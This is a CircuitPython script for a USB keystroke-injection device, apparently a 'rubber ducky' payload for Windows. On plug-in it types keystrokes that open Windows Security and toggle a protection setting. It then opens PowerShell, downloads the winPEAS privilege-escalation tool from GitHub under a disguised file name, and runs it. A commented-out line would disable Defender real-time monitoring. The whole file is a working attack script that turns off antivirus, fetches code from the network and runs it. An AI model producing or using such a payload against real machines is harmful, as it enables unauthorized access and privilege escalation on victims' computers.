import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

def simulate_payload():
    # Wait a moment to allow the OS to recognize the device
    time.sleep(1)

    # Create a keyboard object
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayoutUS(keyboard)
    
    #Open Windows Security
    keyboard.send(Keycode.ESCAPE, Keycode.CONTROL)
    time.sleep(0.5)
    keyboard_layout.write("Windows Security")
    time.sleep(2)
    keyboard.send(Keycode.ENTER)
    time.sleep(2)
    for i in range(4):
        keyboard.send(Keycode.TAB)
        time.sleep(0.3)
        
    time.sleep(1)
    keyboard.send(Keycode.ENTER)
    for i in range(4):
        keyboard.send(Keycode.TAB)
        time.sleep(0.3)
        
    keyboard.send(Keycode.ENTER)
    time.sleep(2)
    keyboard.send(Keycode.SPACE)
    time.sleep(1)
    keyboard.send(Keycode.ALT, Keycode.F4)
    
    
    # Simulate opening PS
    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.5)
    keyboard_layout.write("powershell\n")
    time.sleep(1) 

    #Disable Windows Defender
    #keyboard_layout.write("Set-MpPreference -DisableRealtimeMonitoring $true\n")
    #time.sleep(0.3)
    # Simulate typing the message
    keyboard_layout.write("wget https://github.com/peass-ng/PEASS-ng/releases/download/20240811-aea595a1/winPEASany.exe -o 1a2v3cdewf.exe\n")
    time.sleep(3)
    keyboard_layout.write(".")
    keyboard.send(Keycode.BACKSLASH)
    keyboard_layout.write("1a2v3cdewf.exe\n")
    # Release the keyboard
    keyboard.release_all()

# Start the simulated payload
simulate_payload()

